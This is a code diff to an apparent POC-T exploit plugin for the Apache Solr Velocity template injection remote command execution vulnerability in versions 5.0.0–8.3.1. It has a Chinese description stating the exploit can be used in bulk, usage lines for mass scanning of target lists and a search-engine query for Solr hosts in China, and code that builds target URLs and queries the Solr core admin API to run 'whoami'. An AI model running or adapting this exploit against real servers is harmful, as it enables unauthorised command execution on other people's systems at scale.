@@ -6,7 +6,8 @@ Apache Solr Velocity模版注入远程命令执行漏洞
 
 Desc
 	19 年 10 月 31 日，安全研究员 S00pY 在 GitHub 发布了 ApacheSolr Velocity 模版注入远程命令执行的 POC，经过其他安全团队和人员的验证和复现，此漏洞已经能够被批量利用。
-
+Version
+    5.0.0 - 8.3.1版本
 Usage
 	python POC-T.py -s solr-rce -b solr -iF target.txt
 	python POC-T.py -s solr-rce -b solr -aZ "solr country:cn"
@@ -22,8 +23,8 @@ import sys
 import json
 
 def poc(url):
-    if '://' not in url:
-        url = 'http://' + url
+    url = url if '://' in url else 'http://' + url
+    url = url.split('#')[0].split('?')[0].rstrip('/')
     command = "whoami"
     try:
         core_selector_url = url + '/solr/admin/cores?_=1565526689592&indexInfo=false&wt=json'
